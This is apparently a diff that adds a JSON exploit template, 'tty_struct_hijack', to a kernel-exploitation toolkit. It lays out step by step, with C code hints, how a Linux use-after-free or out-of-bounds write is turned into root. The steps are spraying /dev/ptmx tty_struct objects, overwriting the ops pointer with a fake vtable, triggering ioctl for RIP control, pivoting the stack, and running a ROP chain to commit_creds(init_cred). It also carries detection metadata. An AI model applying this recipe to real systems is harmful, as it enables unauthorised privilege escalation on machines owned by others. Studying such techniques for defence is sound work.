@@ -1,0 +1,50 @@
+{
+  "name": "tty_struct_hijack",
+  "description": "UAF or OOB exploited via tty_struct spray. tty_struct is ~696 bytes (kmalloc-1k). Opening /dev/ptmx allocates a tty_struct with a tty_operations vtable pointer. Corrupt the ops pointer to redirect function calls (e.g., ioctl) through a fake vtable for RIP/PC control.",
+  "target_struct": "tty_struct",
+  "slab_cache": "kmalloc-1k",
+  "technique": "tty_ops_hijack",
+  "vuln_types": ["uaf", "heap-out-of-bounds"],
+  "kernel_versions": "4.4+",
+  "detection_rules": {
+    "required_symbols": ["open", "ioctl", "close", "write"],
+    "crash_functions": ["tty_release", "tty_ioctl", "tty_write", "tty_open", "ptmx_open", "alloc_tty_struct"],
+    "slab_caches": ["kmalloc-1k"],
+    "struct_fields": ["tty_struct.ops", "tty_operations.ioctl", "tty_operations.write"]
+  },
+  "steps": [
+    {
+      "name": "trigger_uaf",
+      "description": "Trigger the use-after-free or OOB write that can reach a tty_struct allocated in the same slab cache.",
+      "code_hint": "// Trigger the vulnerability"
+    },
+    {
+      "name": "spray_tty_struct",
+      "description": "Open many /dev/ptmx file descriptors to spray tty_struct objects in kmalloc-1k, aiming to reclaim the freed slot or place a tty_struct adjacent to the OOB target.",
+      "code_hint": "#define TTY_SPRAY 128\nint tty_fds[TTY_SPRAY];\nfor (int i = 0; i < TTY_SPRAY; i++) {\n    tty_fds[i] = open(\"/dev/ptmx\", O_RDWR | O_NOCTTY);\n    if (tty_fds[i] < 0) perror(\"ptmx\");\n}"
+    },
+    {
+      "name": "corrupt_tty_ops",
+      "description": "Overwrite the tty_struct.ops pointer to point to a fake tty_operations structure. The ops field is at offset 0x18 in tty_struct.",
+      "code_hint": "// tty_struct layout (approximate):\n// +0x00: int magic\n// +0x08: struct kref kref\n// +0x10: struct device *dev\n// +0x18: struct tty_operations *ops  <-- target\nstruct fake_tty_ops fake_ops;\n// Set ops->ioctl to a stack pivot gadget\nfake_ops.ioctl = STACK_PIVOT_GADGET;"
+    },
+    {
+      "name": "trigger_ioctl_for_rip_control",
+      "description": "Call ioctl() on the corrupted tty fd to invoke ops->ioctl with attacker-controlled function pointer, gaining RIP/PC control.",
+      "code_hint": "for (int i = 0; i < TTY_SPRAY; i++) {\n    // ioctl triggers tty->ops->ioctl(tty, cmd, arg)\n    ioctl(tty_fds[i], 0xdeadbeef, user_controlled_arg);\n}"
+    },
+    {
+      "name": "stack_pivot",
+      "description": "Stack pivot gadget redirects kernel stack pointer to controlled data where the ROP chain resides.",
+      "code_hint": "// The ioctl handler is called with:\n//   rdi = tty_struct* (we control this content)\n//   rsi = cmd (0xdeadbeef)\n//   rdx = arg (user controlled)\n// Use: mov rsp, [rdi+OFFSET]; ret  to pivot to our fake stack"
+    },
+    {
+      "name": "rop_to_commit_creds",
+      "description": "Execute ROP chain for commit_creds(init_cred), then return to userspace cleanly.",
+      "code_hint": "// ROP chain for x86_64:\nunsigned long rop[] = {\n    POP_RDI_RET,\n    INIT_CRED,\n    COMMIT_CREDS,\n    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE,\n    0,                // padding\n    0,                // padding\n    (unsigned long)&shell,  // user RIP\n    USER_CS,\n    USER_RFLAGS,\n    (unsigned long)user_sp,\n    USER_SS,\n};"
+    }
+  ],
+  "references": [
+    "https://google.github.io/security-research/pocs/linux/"
+  ]
+}
